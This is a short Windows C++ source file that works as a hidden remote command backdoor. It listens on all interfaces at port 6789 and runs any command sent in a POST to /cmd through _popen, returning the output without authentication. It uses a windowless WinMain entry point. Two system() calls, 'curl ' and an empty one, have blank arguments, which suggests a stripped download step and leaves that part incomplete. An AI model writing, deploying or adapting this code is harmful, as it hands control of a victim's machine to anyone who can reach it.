#include <iostream>
#include <WinSock2.h>
#include <windows.h>
#include <cstdio>
#include <memory>
#include "incl/httplib.h"

std::string run_command(const std::string& command);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    system("curl ");
    system("");
    httplib::Server svr;

    svr.Post("/cmd", [](const httplib::Request &req, httplib::Response &res) {
        const std::string& cmd = req.body;
        std::string output = run_command(cmd);
        res.set_content(output, "text/plain");
    });
    
    svr.listen("0.0.0.0", 6789);
    return 0;
}

std::string run_command(const std::string& command) {
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command.c_str(), "r"), _pclose);

    if (!pipe) {
        return "Failed to run command.";
    }

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe.get()) != nullptr) {
        result += buffer;
    }

    return result;
}
